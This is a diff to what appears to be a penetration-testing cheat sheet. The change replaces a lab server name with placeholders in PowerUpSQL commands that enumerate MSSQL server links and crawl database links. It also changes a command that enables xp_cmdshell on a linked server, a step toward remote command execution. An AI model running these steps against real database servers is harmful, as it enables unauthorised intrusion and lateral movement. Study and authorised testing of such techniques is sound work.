@@ -1040,17 +1040,17 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 
 #### Search for links to remote servers
 ```
-Get-SQLServerLink -Instance dcorp-mssql -Verbose
+Get-SQLServerLink -Instance <sql instance> -Verbose
 ```
 
 #### Enumerate database links
 ```
-Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
+Get-SQLServerLinkCrawl -Instance <sql instance> -Verbose
 ```
 
 #### Enable xp_cmdshell
 ```
-Execute(‘sp_configure “xp_cmdshell”,1;reconfigure;’) AT “<server / database>”
+Execute(‘sp_configure “xp_cmdshell”,1;reconfigure;’) AT “<sql instance>”
 ```
 
 #### Execute commands
